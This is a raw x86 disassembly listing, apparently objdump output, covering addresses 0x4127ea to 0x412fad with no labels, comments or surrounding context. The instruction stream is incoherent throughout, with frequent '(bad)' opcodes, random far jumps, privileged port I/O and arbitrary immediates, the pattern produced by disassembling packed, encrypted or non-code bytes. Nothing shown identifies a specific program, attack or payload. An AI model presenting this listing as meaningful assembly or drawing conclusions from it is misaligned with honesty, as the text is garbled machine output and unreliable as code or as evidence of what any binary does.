  4127ea:	jmp    DWORD PTR [esi+0x31]
  4127ed:	xchg   ebx,eax
  4127ee:	mov    eax,0x2fd64887
  4127f3:	imul   BYTE PTR [ecx+0xa]
  4127f6:	sbb    al,BYTE PTR [esi]
  4127f8:	(bad)  
  4127f9:	ins    BYTE PTR es:[edi],dx
  4127fa:	fsubrp st(5),st
  4127fc:	adc    dl,cl
  4127fe:	xor    DWORD PTR [ebp-0x65],eax
  412801:	pop    es
  412802:	pop    ebp
  412803:	and    al,0xd2
  412805:	hlt    
  412806:	cmp    dh,BYTE PTR [ecx+0x17a73e92]
  41280c:	scas   al,BYTE PTR es:[edi]
  41280d:	aaa    
  41280e:	scas   al,BYTE PTR es:[edi]
  41280f:	les    ebx,FWORD PTR [esi+0x49]
  412812:	sbb    DWORD PTR [eax+ebp*8],ebp
  412815:	int    0xa3
  412817:	xchg   edx,eax
  412818:	push   cs
  412819:	sahf   
  41281a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41281b:	(bad)  
  41281c:	xchg   ebx,eax
  41281d:	sbb    eax,edx
  41281f:	pop    ecx
  412820:	leave  
  412821:	and    al,0x88
  412823:	loope  0x4127f8
  412825:	mov    gs,WORD PTR ds:0xa7918ea
  41282b:	dec    edi
  41282c:	inc    ebx
  41282d:	jmp    0xa814:0xa3842fe0
  412834:	sub    bh,dl
  412836:	and    eax,0xf0d8ae7
  41283b:	jp     0x41287a
  41283d:	push   ds
  41283e:	pop    edi
  41283f:	cmp    eax,0x77deacb5
  412844:	xor    ah,BYTE PTR ss:[edx]
  412847:	sbb    dh,BYTE PTR [ebx]
  412849:	sub    BYTE PTR [ecx+0xb],bh
  41284c:	xchg   esp,eax
  41284d:	dec    edi
  41284e:	xchg   esp,eax
  41284f:	div    BYTE PTR [edi]
  412851:	add    eax,0x7a7601a1
  412856:	jecxz  0x41283e
  412858:	jne    0x4128a1
  41285a:	pop    ds
  41285b:	les    ebp,FWORD PTR [ebp+0x1e4b879c]
  412861:	add    ch,BYTE PTR [edx]
  412863:	test   al,0xb2
  412865:	mov    ch,0x81
  412867:	xor    al,0xe9
  412869:	ins    BYTE PTR es:[edi],dx
  41286a:	mov    eax,ds:0xac48bd5a
  41286f:	or     cl,dh
  412871:	(bad)
  412875:	xchg   ebx,eax
  412876:	pop    edi
  412877:	cwde   
  412878:	push   esp
  412879:	cli    
  41287a:	jle    0x412862
  41287c:	in     al,0xc1
  41287e:	dec    ebx
  41287f:	test   ecx,0x8877198e
  412885:	mov    cl,0x51
  412887:	sbb    dl,BYTE PTR [esi+esi*2]
  41288a:	dec    ecx
  41288b:	rcr    DWORD PTR [eax-0x27],cl
  41288e:	dec    eax
  41288f:	das    
  412890:	(bad)  [edi-0x4f83e578]
  412896:	sub    edi,DWORD PTR [esp+ebp*8]
  412899:	push   0x60b41a44
  41289e:	mov    ecx,0xb9126ea
  4128a3:	xor    BYTE PTR [eax],ah
  4128a5:	dec    esi
  4128a6:	inc    edx
  4128a7:	imul   edi,DWORD PTR [edi],0xa65d7818
  4128ad:	mov    dh,0x5b
  4128af:	pop    es
  4128b0:	jno    0x41292f
  4128b2:	cmp    ecx,DWORD PTR [ebp-0x11]
  4128b5:	jle    0x412875
  4128b7:	xchg   esi,eax
  4128b8:	ret    0x84fc
  4128bb:	pop    es
  4128bc:	add    eax,0x427fd852
  4128c1:	xor    DWORD PTR [eax],edx
  4128c3:	stos   BYTE PTR es:[edi],al
  4128c4:	sbb    eax,0x9a4fdf4a
  4128c9:	fxch   st(4)
  4128cb:	mov    edi,0x126cd95e
  4128d0:	in     al,dx
  4128d1:	mov    ecx,0x75d8e958
  4128d6:	xchg   esi,eax
  4128d7:	push   ss
  4128d8:	sti    
  4128d9:	sub    eax,0x1bcc9fa6
  4128de:	iret   
  4128df:	popa   
  4128e0:	xchg   esi,eax
  4128e1:	test   eax,0x57f9698d
  4128e6:	or     DWORD PTR [edx+0xb266689],ebx
  4128ec:	push   cs
  4128ed:	aaa    
  4128ee:	xchg   ebx,eax
  4128ef:	pop    ebp
  4128f0:	ret    
  4128f1:	clc    
  4128f2:	fld    st(5)
  4128f4:	addr16 sbb al,0x3f
  4128f7:	out    0xc2,al
  4128f9:	es cmp ah,ch
  4128fc:	jo     0x41288f
  4128fe:	xor    al,0x58
  412900:	cmp    al,0x52
  412902:	and    DWORD PTR [edx+0x5f],ecx
  412905:	and    edi,DWORD PTR [esi-0x16]
  412908:	shl    DWORD PTR [ebp-0x574dd423],1
  41290e:	test   DWORD PTR [eax+0x6096de3e],ecx
  412914:	es dec ebx
  412916:	add    eax,0x9213db12
  41291b:	arpl   WORD PTR [ecx+ecx*2-0x2978ebb2],sp
  412922:	ret    
  412923:	(bad)  
  412924:	sub    BYTE PTR [esi],bl
  412926:	into   
  412927:	mov    dl,0xaa
  412929:	loop   0x41299f
  41292b:	and    bh,BYTE PTR [ecx+0x5f88a5d2]
  412931:	cmp    ah,ch
  412933:	shr    DWORD PTR [ebp+ebp*8+0x6c29f291],1
  41293a:	jns    0x41296e
  41293c:	mov    esp,0x881eeb73
  412941:	aad    0xee
  412943:	mov    al,ds:0x2a00904d
  412948:	and    BYTE PTR [esi+eax*4-0x3b],ah
  41294c:	cmp    al,0x6a
  41294e:	adc    DWORD PTR [esp+eiz*2-0x3f01d118],eax
  412955:	mov    ecx,0x9129effc
  41295a:	mov    eax,ds:0x38bd9a6
  41295f:	pop    esp
  412960:	adc    eax,0x23e04fc4
  412965:	mov    gs,WORD PTR ds:0x9bc59f34
  41296b:	(bad)  
  41296c:	test   dh,0xa1
  41296f:	nop
  412970:	cli    
  412971:	jb     0x4128f3
  412973:	push   esi
  412974:	or     al,0xfb
  412976:	aas    
  412977:	enter  0x3312,0x26
  41297b:	fstp   TBYTE PTR [esi]
  41297d:	jbe    0x412993
  41297f:	dec    edx
  412980:	pushf  
  412981:	les    ecx,FWORD PTR [ebp+0x693f4171]
  412987:	mov    dl,0xc2
  412989:	sbb    al,0xd0
  41298b:	jne    0x412958
  41298d:	bound  edx,QWORD PTR [ebp-0x641c499d]
  412993:	pop    edx
  412994:	mov    esp,0x8d0063fd
  412999:	sbb    cl,ch
  41299b:	add    al,0x6c
  41299d:	fsqrt  
  41299f:	loop   0x4129b0
  4129a1:	and    ch,ah
  4129a3:	jge    0x412965
  4129a5:	cmp    DWORD PTR [ecx-0xa84efd8],ebx
  4129ab:	mov    bl,0x3f
  4129ad:	adc    eax,0x2eaa60eb
  4129b2:	sbb    al,0x96
  4129b4:	push   ebx
  4129b5:	stc    
  4129b6:	sahf   
  4129b7:	sbb    ecx,DWORD PTR [edx*8+0x4a1d62bc]
  4129be:	outs   dx,DWORD PTR ds:[esi]
  4129bf:	mov    bh,BYTE PTR [ecx+0x5c7b3bd5]
  4129c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4129c6:	daa    
  4129c7:	mov    eax,ecx
  4129c9:	pop    esp
  4129ca:	cli    
  4129cb:	inc    ebx
  4129cc:	out    dx,eax
  4129cd:	std    
  4129ce:	repz push 0x8ab7c468
  4129d4:	lahf   
  4129d5:	push   eax
  4129d6:	xchg   ebx,eax
  4129d7:	mov    eax,0xf23d62c1
  4129dc:	cwde   
  4129dd:	and    al,0x99
  4129df:	sbb    al,0x2d
  4129e1:	int3   
  4129e2:	into   
  4129e3:	dec    DWORD PTR [ebp+0x28]
  4129e6:	es xchg edx,eax
  4129e8:	mov    ah,0x6a
  4129ea:	repz aam 0x31
  4129ed:	jmp    0xdca4:0x8881d756
  4129f4:	jecxz  0x4129f4
  4129f6:	test   BYTE PTR [esi+0x6b1edb51],ch
  4129fc:	ins    BYTE PTR es:[edi],dx
  4129fd:	fdiv   DWORD PTR [eax-0x7e]
  412a00:	sub    DWORD PTR [edi],edx
  412a02:	or     BYTE PTR [ebx],dh
  412a04:	xor    BYTE PTR [ebx-0x6d5be0cf],dh
  412a0a:	jbe    0x4129ab
  412a0c:	fs out dx,al
  412a0e:	cld    
  412a0f:	repz jge 0x4129f1
  412a12:	fwait
  412a13:	push   0xab721339
  412a18:	inc    edi
  412a19:	mov    DWORD PTR [edx+0x1c],ebp
  412a1c:	and    al,0xcb
  412a1e:	test   DWORD PTR [eax-0x638afd8c],esi
  412a24:	mov    ebp,0x3a360bcf
  412a29:	push   ecx
  412a2a:	mov    ecx,0x2c8a4018
  412a2f:	ror    BYTE PTR es:0x34635793,1
  412a36:	dec    ebx
  412a37:	sub    DWORD PTR [ebx],ebp
  412a39:	gs mov ebp,0xdf5a5cf8
  412a3f:	enter  0xaee4,0x4c
  412a43:	sub    DWORD PTR [eax-0x6d35d4b],ecx
  412a49:	mov    cs,edi
  412a4b:	cmp    ch,0xd0
  412a4e:	xor    esp,ebx
  412a50:	cmp    eax,0x73abaf66
  412a55:	imul   edx,DWORD PTR [ecx-0x255c363a],0xffffff80
  412a5c:	lods   al,BYTE PTR ds:[esi]
  412a5d:	mov    eax,cs
  412a5f:	adc    eax,0xb6394803
  412a64:	push   es
  412a65:	dec    ebp
  412a66:	mov    dl,0x6c
  412a68:	mov    edi,0x1cce1fd
  412a6d:	pop    ebp
  412a6e:	iret   
  412a6f:	cmp    DWORD PTR [ecx],ebx
  412a71:	pop    ebx
  412a72:	mov    esp,0x3b09471c
  412a77:	push   edx
  412a78:	shr    BYTE PTR [esi],1
  412a7a:	jmp    0x6c0a5c7e
  412a7f:	ret    0xafd5
  412a82:	lahf   
  412a83:	les    eax,FWORD PTR [esi-0x30]
  412a86:	(bad)  
  412a87:	hlt    
  412a88:	cs push es
  412a8a:	outs   dx,BYTE PTR ds:[esi]
  412a8b:	rcl    cl,1
  412a8d:	and    eax,0x43bc155a
  412a92:	cli    
  412a93:	aaa    
  412a94:	jno    0x412a5d
  412a96:	sub    eax,0x3b888248
  412a9b:	sbb    dl,BYTE PTR [edi]
  412a9d:	push   es
  412a9e:	pop    ds
  412a9f:	ins    BYTE PTR es:[edi],dx
  412aa0:	sub    esi,eax
  412aa2:	and    BYTE PTR es:[ecx-0x22398f6e],bh
  412aa9:	push   edx
  412aaa:	mov    dh,0x6e
  412aac:	jmp    0x86f8d442
  412ab1:	cmp    eax,0x5303e26
  412ab6:	stc    
  412ab7:	dec    esp
  412ab8:	in     al,dx
  412ab9:	lea    ebp,[edi-0x6ed29411]
  412abf:	inc    esp
  412ac0:	inc    esp
  412ac1:	into   
  412ac2:	jmp    0xea3a7c82
  412ac7:	gs mov ah,0x32
  412aca:	shl    edx,cl
  412acc:	jge    0x412b18
  412ace:	mov    dh,0x42
  412ad0:	scas   eax,DWORD PTR es:[edi]
  412ad1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ad2:	imul   edx,DWORD PTR [eax+0x1c],0xbb919b9a
  412ad9:	(bad)  
  412ada:	icebp  
  412adb:	xchg   esp,eax
  412adc:	out    0x53,eax
  412ade:	adc    edx,ebp
  412ae0:	and    ecx,DWORD PTR ds:0xfc0d1068
  412ae6:	sahf   
  412ae7:	(bad)  
  412ae8:	mov    BYTE PTR [edx+0x1c1aaf47],bl
  412aee:	sbb    al,0xd3
  412af0:	(bad)  
  412af1:	scas   al,BYTE PTR es:[edi]
  412af2:	and    eax,0xe4e9fce2
  412af7:	mov    ds:0x87cd7a09,eax
  412afc:	and    esp,esp
  412afe:	and    al,0x18
  412b00:	inc    eax
  412b01:	cmp    DWORD PTR [edx-0xb],esi
  412b04:	popa   
  412b05:	out    dx,al
  412b06:	jae    0x412b48
  412b08:	rcr    BYTE PTR [eax+0x6a],cl
  412b0b:	cmp    esp,DWORD PTR [ecx+0x66f7345c]
  412b11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412b12:	xchg   esp,eax
  412b13:	mov    ecx,0x6bb2c52c
  412b18:	fistp  DWORD PTR [esi+edi*8]
  412b1b:	mov    esp,0x104b59a9
  412b20:	push   esp
  412b21:	mov    ebx,0xec2c242c
  412b26:	xchg   ecx,eax
  412b27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b28:	sbb    DWORD PTR [edx+eax*1+0x5d],eax
  412b2c:	cdq    
  412b2d:	sub    al,0xc6
  412b2f:	sub    DWORD PTR [eax+eiz*2-0x66],edx
  412b33:	jo     0x412b3e
  412b35:	lock inc eax
  412b37:	mov    DWORD PTR [ebx+ecx*8-0x5cb9431b],edi
  412b3e:	aas    
  412b3f:	ds es out 0x8e,al
  412b43:	sbb    DWORD PTR [edi+ebx*8],edi
  412b46:	xchg   ebx,eax
  412b47:	xchg   esp,eax
  412b48:	and    al,0x17
  412b4a:	loop   0x412b21
  412b4c:	dec    ecx
  412b4d:	dec    DWORD PTR [eax]
  412b4f:	repz mov esp,0x8cc7da29
  412b55:	fstp   TBYTE PTR [eax]
  412b57:	fdivr  DWORD PTR [ebx]
  412b59:	xor    BYTE PTR [edx],dh
  412b5b:	or     DWORD PTR [esi],esi
  412b5d:	imul   edi,ecx,0x10599138
  412b63:	jns    0x412b20
  412b65:	mov    edx,0xdbcc3b98
  412b6a:	mov    ecx,DWORD PTR [edx]
  412b6c:	imul   esi,esi,0x3d
  412b6f:	or     al,0x37
  412b71:	les    ebx,FWORD PTR [ebx-0x5c434bd1]
  412b77:	add    DWORD PTR [edx],ebx
  412b79:	daa    
  412b7a:	sbb    al,0xd
  412b7c:	das    
  412b7d:	push   cs
  412b7e:	mov    al,cl
  412b80:	jmp    0x412ba2
  412b82:	or     DWORD PTR [ecx],edx
  412b84:	scas   al,BYTE PTR es:[edi]
  412b85:	inc    ebp
  412b86:	add    DWORD PTR ss:[edi],ebx
  412b89:	std    
  412b8a:	nop
  412b8b:	dec    ebp
  412b8c:	cmp    eax,eax
  412b8e:	xor    BYTE PTR [edx+0x56392363],0xda
  412b95:	mov    bh,0x0
  412b97:	clc    
  412b98:	pop    esp
  412b99:	push   0x8c5651e9
  412b9e:	xchg   ebp,eax
  412b9f:	sub    bh,0xb7
  412ba2:	cmp    ebx,0xdb5c5ef5
  412ba8:	mov    WORD PTR [edi+0x16c34ef0],es
  412bae:	fsub   QWORD PTR [edx-0x1792921a]
  412bb4:	bndldx (bad),[edx-0x65d0b034]
  412bbb:	mov    ch,0x36
  412bbd:	mov    gs,edi
  412bbf:	mov    edi,0x73754b99
  412bc4:	cmc    
  412bc5:	push   ebp
  412bc6:	xchg   esp,eax
  412bc7:	inc    esp
  412bc8:	loopne 0x412b9a
  412bca:	push   0xfffffffc
  412bcc:	pusha  
  412bcd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412bce:	aam    0x24
  412bd0:	ins    BYTE PTR es:[edi],dx
  412bd1:	pop    es
  412bd2:	mov    dh,0x97
  412bd4:	fldcw  WORD PTR [edi+0xa]
  412bd7:	pushf  
  412bd8:	pop    edi
  412bd9:	xchg   ebx,eax
  412bda:	icebp  
  412bdb:	popa   
  412bdc:	jb     0x412c33
  412bde:	jb     0x412c13
  412be0:	sub    al,0xd2
  412be2:	test   al,0x32
  412be4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412be5:	xor    DWORD PTR [ecx+0x52fa5562],ebp
  412beb:	sbb    ebx,ebp
  412bed:	mov    esp,0x7bff9a1d
  412bf2:	or     BYTE PTR [ebx],cl
  412bf4:	jmp    0x412c48
  412bf6:	pop    edi
  412bf7:	mov    bh,0x64
  412bf9:	loope  0x412baa
  412bfb:	aaa    
  412bfc:	jns    0x412be7
  412bfe:	pop    ebx
  412bff:	cmp    eax,0x786ff37e
  412c04:	scas   al,BYTE PTR es:[edi]
  412c05:	cmp    BYTE PTR [eax-0x4ea57450],0x31
  412c0c:	mov    ah,0x93
  412c0e:	xchg   ebp,eax
  412c0f:	add    al,0x3d
  412c11:	inc    ebp
  412c12:	repz sbb DWORD PTR [ebx+0x12],eax
  412c16:	pop    edx
  412c17:	dec    ebx
  412c18:	xchg   edi,eax
  412c19:	outs   dx,BYTE PTR ds:[esi]
  412c1a:	dec    esp
  412c1b:	ins    DWORD PTR es:[edi],dx
  412c1c:	push   ebx
  412c1d:	inc    BYTE PTR [eax]
  412c1f:	mov    edi,0xa7153cf4
  412c24:	pop    esi
  412c25:	loope  0x412c12
  412c27:	inc    ebx
  412c28:	pop    ecx
  412c29:	repnz xor ch,BYTE PTR ss:[ebx+0x17]
  412c2e:	icebp  
  412c2f:	shl    DWORD PTR [ecx+0x4e],0xb4
  412c33:	xlat   BYTE PTR ds:[ebx]
  412c34:	test   DWORD PTR [esi-0x56ba5373],ebp
  412c3a:	repz aas 
  412c3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412c3d:	and    al,0x0
  412c3f:	push   ds
  412c40:	jp     0x412c17
  412c42:	pop    edx
  412c43:	dec    edi
  412c44:	mov    bl,BYTE PTR [ebp-0x69b6d775]
  412c4a:	cli    
  412c4b:	push   edx
  412c4c:	xchg   ebp,eax
  412c4d:	pop    ecx
  412c4e:	pop    ss
  412c4f:	test   eax,0x3d8f0f13
  412c54:	sub    cl,BYTE PTR [ebp-0x77]
  412c57:	out    0x5a,eax
  412c59:	mov    edx,0x6f475640
  412c5e:	xor    bh,BYTE PTR [eax]
  412c60:	in     eax,0x98
  412c62:	or     BYTE PTR [esi],0x59
  412c65:	out    dx,al
  412c66:	aaa    
  412c67:	pop    edi
  412c68:	ss daa 
  412c6a:	jmp    0xd4082c5f
  412c6f:	mov    ecx,0xb72fb4d6
  412c74:	data16 (bad) 
  412c76:	mov    dh,0xad
  412c78:	pushf  
  412c79:	mov    ebx,0x6f6166b3
  412c7e:	push   ebp
  412c7f:	ss imul eax,ebx,0xffffffad
  412c83:	sub    al,0x9b
  412c85:	mov    al,ds:0xcdab845a
  412c8a:	mov    ebx,0x94954b17
  412c8f:	out    dx,eax
  412c90:	clc    
  412c91:	dec    ebx
  412c92:	int3   
  412c93:	inc    ecx
  412c94:	add    eax,0xc2e12db4
  412c99:	jb     0x412c22
  412c9b:	push   esi
  412c9c:	pop    es
  412c9d:	out    dx,eax
  412c9e:	push   0x300ef50b
  412ca3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ca4:	xor    al,0x1d
  412ca6:	inc    edx
  412ca7:	iret   
  412ca8:	(bad)  
  412ca9:	bound  edi,QWORD PTR [edi+0x58]
  412cac:	fbstp  TBYTE PTR fs:[esi-0x3b30ccdb]
  412cb3:	mov    ch,0x1d
  412cb5:	retf   0xba7
  412cb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412cb9:	ins    DWORD PTR es:[edi],dx
  412cba:	pop    ds
  412cbb:	arpl   bx,bx
  412cbd:	ret    
  412cbe:	sub    esp,esp
  412cc0:	hlt    
  412cc1:	xor    esp,edx
  412cc3:	dec    edi
  412cc4:	adc    eax,0x7ccf463c
  412cc9:	inc    ebp
  412cca:	dec    ebp
  412ccb:	jmp    DWORD PTR [eax-0x5a]
  412cce:	add    DWORD PTR [esi+0x46a32a04],0x57
  412cd5:	ja     0x412cb0
  412cd7:	add    al,BYTE PTR [ebp+0x6e]
  412cda:	xor    ch,dl
  412cdc:	les    esi,FWORD PTR [ebp+0x4f7fe2d6]
  412ce2:	scas   al,BYTE PTR es:[edi]
  412ce3:	outs   dx,DWORD PTR ds:[esi]
  412ce4:	aam    0xec
  412ce6:	fwait
  412ce7:	inc    eax
  412ce8:	bound  esi,QWORD PTR [edx+0x16]
  412ceb:	sub    eax,0x6adf5ef7
  412cf0:	sbb    edx,esp
  412cf2:	xor    BYTE PTR [eax+ecx*1+0x27a5d302],dl
  412cf9:	mov    ss,WORD PTR [ecx-0x6983511a]
  412cff:	fstp   DWORD PTR [edx-0x75]
  412d02:	push   eax
  412d03:	aad    0x9d
  412d05:	in     al,dx
  412d06:	xor    eax,0xd138a40f
  412d0b:	xor    al,0xb1
  412d0d:	pop    eax
  412d0e:	mov    edi,0x44460d5a
  412d13:	inc    edx
  412d14:	jno    0x412d28
  412d16:	aaa    
  412d17:	sub    al,0x2f
  412d19:	jo     0x412ca6
  412d1b:	out    0x52,al
  412d1d:	sbb    al,0xed
  412d1f:	pop    edx
  412d20:	xchg   esp,eax
  412d21:	cmp    eax,0x1310bef
  412d26:	popa   
  412d27:	imul   esp
  412d29:	adc    BYTE PTR [ecx-0xc],al
  412d2c:	adc    eax,0x3111c4fb
  412d31:	and    al,0x88
  412d33:	pop    esi
  412d34:	enter  0x2ee9,0xc9
  412d38:	add    ch,BYTE PTR ds:0x11ca702e
  412d3e:	rcr    esp,cl
  412d40:	mov    eax,0xc121793
  412d45:	stc    
  412d46:	jns    0x412d19
  412d48:	mov    dh,0x5d
  412d4a:	fwait
  412d4b:	or     ebx,DWORD PTR [esi+0x102bc161]
  412d51:	in     eax,dx
  412d52:	pop    edi
  412d53:	mov    esp,0x87db0615
  412d58:	mov    esi,0x8539f679
  412d5d:	push   es
  412d5e:	add    DWORD PTR [ebx+0x14],0xb08abbbc
  412d65:	jmp    0x19d7:0x313b6df4
  412d6c:	push   eax
  412d6d:	leave  
  412d6e:	jno    0x412d5b
  412d70:	ror    DWORD PTR [ebp+0x14b6d4d5],1
  412d76:	inc    edx
  412d77:	lock add al,0x23
  412d7a:	inc    esp
  412d7b:	int3   
  412d7c:	aam    0x86
  412d7e:	outs   dx,BYTE PTR ds:[esi]
  412d7f:	outs   dx,DWORD PTR gs:[esi]
  412d81:	loope  0x412d98
  412d83:	dec    ecx
  412d84:	mov    dl,0xc9
  412d86:	popa   
  412d87:	dec    edx
  412d88:	into   
  412d89:	mov    ecx,0x53131fe4
  412d8e:	sub    BYTE PTR [edx],bl
  412d90:	ret    
  412d91:	or     bh,BYTE PTR [esi-0x4a]
  412d94:	add    ch,BYTE PTR [ebp-0x325a027c]
  412d9a:	dec    edi
  412d9b:	jne    0x412d1d
  412d9d:	xchg   esi,eax
  412d9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412d9f:	xor    al,cl
  412da1:	xchg   BYTE PTR [edx+eiz*4-0x54],dl
  412da5:	outs   dx,DWORD PTR ds:[esi]
  412da6:	dec    edi
  412da7:	adc    eax,0x5633f1c0
  412dac:	xchg   ecx,eax
  412dad:	popf   
  412dae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412daf:	adc    DWORD PTR [ebx+ecx*2+0x121d15b6],ebx
  412db6:	add    dh,BYTE PTR [ebp+edi*8+0x29]
  412dba:	fwait
  412dbb:	mov    ch,0x3c
  412dbd:	add    al,BYTE PTR [ebp+0x3d40b0e7]
  412dc3:	stos   BYTE PTR es:[edi],al
  412dc4:	aam    0xb1
  412dc6:	sbb    edx,DWORD PTR [ebx+0x7dfa6963]
  412dcc:	inc    ebx
  412dcd:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412dcf:	sub    eax,0x4f2ca0da
  412dd4:	inc    ebx
  412dd5:	adc    BYTE PTR ss:[ebp+0x4a],dh
  412dd9:	or     al,0xb6
  412ddb:	dec    edx
  412ddc:	scas   al,BYTE PTR es:[edi]
  412ddd:	or     edi,edx
  412ddf:	stos   BYTE PTR es:[edi],al
  412de0:	pop    ss
  412de1:	jo     0x412e1c
  412de3:	xor    DWORD PTR [edx+0x6b],0x4da40431
  412dea:	fisttp QWORD PTR [eax]
  412dec:	xchg   ecx,eax
  412ded:	dec    edi
  412dee:	inc    ebx
  412def:	xchg   esi,eax
  412df0:	mov    eax,ds:0xd8ff8fb7
  412df5:	and    eax,0x8878aa8c
  412dfa:	les    ecx,FWORD PTR [edx]
  412dfc:	mov    al,0x2
  412dfe:	push   edx
  412dff:	cmp    edx,DWORD PTR [edx-0x60c708b]
  412e05:	(bad)  
  412e06:	jmp    0x412dfc
  412e08:	push   ebp
  412e09:	push   ebx
  412e0a:	inc    ecx
  412e0b:	test   al,0x24
  412e0d:	inc    ebx
  412e0e:	ins    DWORD PTR es:[edi],dx
  412e0f:	push   ebx
  412e10:	sub    eax,edi
  412e12:	pusha  
  412e13:	push   0x9aa34fb2
  412e18:	fwait
  412e19:	gs aas 
  412e1b:	push   edx
  412e1c:	dec    ebp
  412e1d:	cmp    esp,DWORD PTR [ecx-0x2ed3a60b]
  412e23:	or     bh,0xc4
  412e26:	add    DWORD PTR [ebx],esi
  412e28:	clc    
  412e29:	rol    dh,0xbe
  412e2c:	(bad)  
  412e2d:	jno    0x412e3c
  412e2f:	adc    BYTE PTR [edi-0x36],cl
  412e32:	mov    ds:0xb01ec845,eax
  412e37:	sbb    edx,0x6c846fdc
  412e3d:	hlt    
  412e3e:	es es cmp esi,eax
  412e42:	jp     0x412eab
  412e44:	pop    ecx
  412e45:	(bad)  
  412e47:	mov    DWORD PTR ss:[ebx],ebx
  412e4a:	adc    esp,esp
  412e4c:	jbe    0x412e2b
  412e4e:	stos   BYTE PTR es:[edi],al
  412e4f:	inc    esi
  412e50:	jmp    0xbb3:0xd71a5624
  412e57:	fisttp QWORD PTR [eax-0x3570071f]
  412e5d:	aad    0x94
  412e5f:	or     esp,DWORD PTR cs:[edx+0x35]
  412e63:	adc    al,0x48
  412e65:	call   0xccf3:0xea28f963
  412e6c:	retf   0xe330
  412e6f:	dec    edi
  412e70:	shr    BYTE PTR [esi-0x77],cl
  412e73:	adc    eax,0xe53be686
  412e78:	xchg   DWORD PTR [esi*4+0x4554fc51],ebp
  412e7f:	rol    DWORD PTR [edi+0x6637cacd],0x95
  412e86:	sub    al,0xbf
  412e88:	mov    bh,0xc1
  412e8a:	jecxz  0x412ee7
  412e8c:	icebp  
  412e8d:	cmc    
  412e8e:	(bad)  
  412e8f:	sub    al,ah
  412e91:	test   edx,ebx
  412e93:	cs lock and al,0xde
  412e97:	xor    ah,BYTE PTR [ecx]
  412e99:	cmc    
  412e9a:	fisttp QWORD PTR [ecx+0x5d]
  412e9d:	sbb    BYTE PTR [eax-0x36],0x14
  412ea1:	mov    ah,0x58
  412ea3:	push   ebx
  412ea4:	push   ds
  412ea5:	les    esp,FWORD PTR [edx+0x26]
  412ea8:	mov    ebp,0xe31958f6
  412ead:	jmp    0x229f:0x23ceec9b
  412eb4:	xor    cl,dh
  412eb6:	or     al,BYTE PTR [esi]
  412eb8:	mov    edi,0x9b640890
  412ebd:	xor    ebx,DWORD PTR [ebp-0x2d190937]
  412ec3:	aam    0xb5
  412ec5:	jl     0x412e77
  412ec7:	jl     0x412e8a
  412ec9:	clc    
  412eca:	xchg   ebx,eax
  412ecb:	into   
  412ecc:	mov    edx,0xe366ba98
  412ed1:	pop    ecx
  412ed2:	fadd   QWORD PTR [edx-0x53]
  412ed5:	std    
  412ed6:	mov    ds:0x8fb194a8,eax
  412edb:	jo     0x412e93
  412edd:	call   0x5329:0x4cd38a4f
  412ee4:	sbb    ch,BYTE PTR [edx-0x67]
  412ee7:	iret   
  412ee8:	gs sbb dl,BYTE PTR es:[ebx-0x42]
  412eed:	jle    0x412ecc
  412eef:	test   DWORD PTR [edx-0xe],eax
  412ef2:	jp     0x412eba
  412ef4:	bound  edi,QWORD PTR [esi-0x79]
  412ef7:	or     BYTE PTR [eax-0x1bddafc3],ah
  412efd:	xor    eax,0x1bc05091
  412f02:	(bad)  
  412f03:	fiadd  DWORD PTR [edi+0x72]
  412f06:	sti    
  412f07:	jnp    0x412f57
  412f09:	jmp    0x461a:0xc9ef6c48
  412f10:	fcmove st,st(0)
  412f12:	rcl    DWORD PTR [ebx-0x3c65e3e],1
  412f18:	lds    ecx,FWORD PTR [ebp-0x25]
  412f1b:	in     eax,0x7f
  412f1d:	and    dl,BYTE PTR [esi+0x31115d99]
  412f23:	cmp    eax,0xad839d21
  412f28:	or     al,0x2d
  412f2a:	outs   dx,BYTE PTR ds:[esi]
  412f2b:	or     bh,bh
  412f2d:	sub    BYTE PTR [ecx-0x3c],ch
  412f30:	cld    
  412f31:	pop    esp
  412f32:	mov    eax,0x29341c0d
  412f37:	push   ds
  412f38:	call   0x5163:0x84c6c5a4
  412f3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412f40:	repz adc ecx,DWORD PTR [ebx]
  412f43:	scas   al,BYTE PTR es:[edi]
  412f44:	stc    
  412f45:	addr16 (bad) 
  412f47:	(bad)  
  412f48:	adc    DWORD PTR [ebx],esp
  412f4a:	adc    esi,DWORD PTR [ecx-0x4f]
  412f4d:	jb     0x412f3f
  412f4f:	das    
  412f50:	sub    BYTE PTR [edi],dh
  412f52:	pop    esi
  412f53:	scas   eax,DWORD PTR es:[edi]
  412f54:	(bad)  
  412f55:	gs popf 
  412f57:	test   BYTE PTR [edx+0x4702e3e1],cl
  412f5d:	jae    0x412f10
  412f5f:	mov    edx,0x14fb5c96
  412f64:	push   esp
  412f65:	mov    dl,0x8
  412f67:	cmp    eax,0xdf773f3b
  412f6c:	xor    ch,dh
  412f6e:	or     eax,DWORD PTR [ebp-0x4a]
  412f71:	int    0x37
  412f73:	out    0xdd,al
  412f75:	xor    ecx,DWORD PTR [ebp+0x9]
  412f78:	dec    eax
  412f79:	cmp    BYTE PTR [esi-0x31a05fd9],bh
  412f7f:	shr    DWORD PTR [eax-0x26284cab],0x3e
  412f86:	xor    bl,dl
  412f88:	sbb    al,0xa7
  412f8a:	dec    ebx
  412f8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412f8c:	cld    
  412f8d:	jne    0x412fdb
  412f8f:	test   al,0xc9
  412f91:	jmp    0xfc4300df
  412f96:	or     dh,ah
  412f98:	jnp    0x412fcc
  412f9a:	cmp    BYTE PTR [edx-0x35],al
  412f9d:	sbb    al,0xf5
  412f9f:	and    eax,0x6b60bf1
  412fa4:	add    dh,BYTE PTR [eax+0x1c]
  412fa7:	sbb    al,0x35
  412fa9:	adc    al,0x7c
  412fab:	je     0x412fc9
  412fad:	push   ecx
